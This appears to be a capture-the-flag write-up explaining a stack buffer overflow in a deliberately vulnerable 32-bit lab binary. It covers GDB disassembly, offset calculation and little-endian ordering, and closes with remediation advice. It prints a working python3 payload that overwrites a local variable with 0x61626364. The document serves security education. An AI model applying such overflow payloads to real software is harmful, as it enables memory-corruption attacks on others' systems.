
# ex01 – Stack Buffer Overflow (Overwriting a Variable with a Specific Value)

## Objective

The goal of this challenge is to display the following success message:

```text
you have correctly got the variable to the right value
```

Unlike **ex00**, where the objective was only to make the variable `modified` non-zero, this challenge requires overwriting the variable with an **exact hexadecimal value**.

This exercise introduces two essential binary exploitation concepts:

- Calculating memory offsets from assembly code.
- Understanding **little-endian** representation on x86 processors.

---

# Initial Analysis

Before attempting the exploit, I analyzed the binary to understand its structure and identify potential vulnerabilities.

## Identify the Binary

```bash
file bin
```

Result:

- ELF 32-bit executable (Intel i386)
- Dynamically linked
- Not stripped

Because the binary is not stripped, symbol names remain available, making reverse engineering easier.

---

## Check Security Protections

```bash
checksec --file=bin
```

The binary intentionally disables several modern protections to allow stack overflow exploitation.

Typical protections observed:

- No RELRO
- No Stack Canary
- NX Disabled
- No PIE

These disabled protections simplify learning by making memory layout predictable.

---

## Inspect Strings

```bash
strings bin
```

Interesting strings:

```text
you have correctly got the variable to the right value
Try again
```

Unlike the previous exercise, the success message indicates that the variable must contain a **specific value**, not simply any non-zero value.

---

## Inspect Symbols

```bash
readelf -s bin
```

Interesting imported functions:

```text
strcpy
printf
puts
errx
```

The presence of `strcpy()` immediately suggests a possible buffer overflow because `strcpy()` copies data without checking the destination buffer size.

---

# Program Behavior

Running the program without arguments:

```bash
./bin
```

Output:

```text
bin: please specify an argument
```

This indicates that the program expects user input through the command-line arguments (`argv`).

Running with a small argument:

```bash
./bin AAAA
```

Output:

```text
Try again, you got 0x00000000
```

Running with a long input:

```bash
./bin $(python3 -c 'print("A"*100)')
```

Output:

```text
Try again, you got 0x41414141
Segmentation fault
```

This confirms that:

- A stack overflow exists.
- The variable `modified` is overwritten with the hexadecimal value `0x41414141`.
- The overflow eventually reaches the saved return address, causing a segmentation fault.

The value `0x41414141` corresponds to four ASCII characters:

```text
'A' = 0x41
```

---

# Reverse Engineering with GDB

The `main` function was examined using GDB.

```bash
gdb ./bin
```

Inside GDB:

```gdb
disassemble main
```

The most important instructions are:

```asm
movl $0x0,0x5c(%esp)
```

This initializes the variable:

```c
modified = 0;
```

---

```asm
lea 0x1c(%esp), %eax
```

`LEA` (Load Effective Address) loads the address of the input buffer.

Therefore:

```text
buffer -> esp + 0x1c
```

---

```asm
call strcpy
```

Equivalent C code:

```c
strcpy(buffer, argv[1]);
```

Because `strcpy()` performs no bounds checking, user input may overwrite adjacent memory.

---

```asm
mov 0x5c(%esp), %eax
cmp $0x61626364, %eax
```

Equivalent C logic:

```c
if (modified == 0x61626364)
```

This instruction reveals the exact value required to solve the challenge.

---

# Calculating the Offset

The stack locations are:

```text
buffer   -> esp + 0x1c
modified -> esp + 0x5c
```

Subtracting the addresses:

```text
0x5c - 0x1c = 0x40
```

Convert to decimal:

```text
0x40 = 64
```

Therefore:

```text
Buffer size = 64 bytes
```

The first 64 bytes fill the buffer.

The following four bytes overwrite the `modified` variable.

---

# Understanding Little Endian

The comparison is made against:

```text
0x61626364
```

Breaking it into bytes:

```text
61 62 63 64
```

ASCII representation:

```text
61 -> a
62 -> b
63 -> c
64 -> d
```

However, Intel x86 processors use **Little Endian** byte ordering.

Therefore the bytes must be stored in memory as:

```text
64 63 62 61
```

Which corresponds to:

```text
d c b a
```

This is why writing `"abcd"` would fail.

The correct byte sequence is:

```text
\x64\x63\x62\x61
```

---

# Crafting the Payload

Payload layout:

```text
64 bytes of padding
+
target value (little endian)
```

Python payload:

```python
b"A"*64 + b"\x64\x63\x62\x61"
```

Because Python 3 prints UTF-8 text by default, raw bytes are generated using `sys.stdout.buffer.write()`.

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")'
```

Execute the binary:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")')"
```

Output:

```text
you have correctly got the variable to the right value
```

The exploit successfully overwrites the `modified` variable with the expected value.

---

# Why the Exploit Works

The stack layout is approximately:

```text
Higher Addresses
+----------------------+
| Return Address       |
+----------------------+
| Saved EBP            |
+----------------------+
| modified             |
+----------------------+
| buffer[64]           |
+----------------------+
Lower Addresses
```

The first 64 bytes completely fill the buffer.

The next four bytes overwrite `modified`.

Because the overwritten value matches `0x61626364`, the comparison succeeds and the program prints the success message.

Unlike later binary exploitation challenges, this exercise still does **not** require controlling execution flow or overwriting the return address.

---

# Commands Used

```bash
file bin

checksec --file=bin

strings bin

readelf -s bin

objdump -d bin

gdb ./bin

disassemble main

./bin

./bin AAAA

./bin $(python3 -c 'print("A"*100)')

./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")')"
```

---

# Key Concepts Learned

- Stack buffer overflow
- Command-line arguments (`argv`)
- Unsafe use of `strcpy()`
- Reading assembly with GDB
- Calculating stack offsets
- Memory layout
- Hexadecimal representation
- ASCII encoding
- Little-endian byte ordering
- Constructing exploit payloads
- Overwriting local variables

---

# Remediation

This vulnerability can be prevented by:

- Replacing `strcpy()` with `strncpy()` or another bounded copy function.
- Validating the length of all user input before copying.
- Compiling with Stack Canaries (`-fstack-protector`).
- Enabling Non-Executable memory (NX).
- Enabling Position Independent Executables (PIE).
- Enabling Full RELRO.
- Keeping ASLR enabled.
- Performing secure code reviews to detect unsafe memory operations.

---

# Key Takeaway

This challenge extends the previous exercise by demonstrating that successful exploitation often requires writing an **exact value** into memory rather than simply corrupting it.

It also introduces one of the most important concepts in binary exploitation: **little-endian encoding**. Understanding how integers are stored in memory is essential for later challenges involving return addresses, function pointers, Return-Oriented Programming (ROP), and advanced memory corruption techniques.

By analyzing the assembly, calculating the buffer offset, and constructing the payload manually, this challenge reinforces the fundamental workflow used in real-world binary exploitation and reverse engineering.

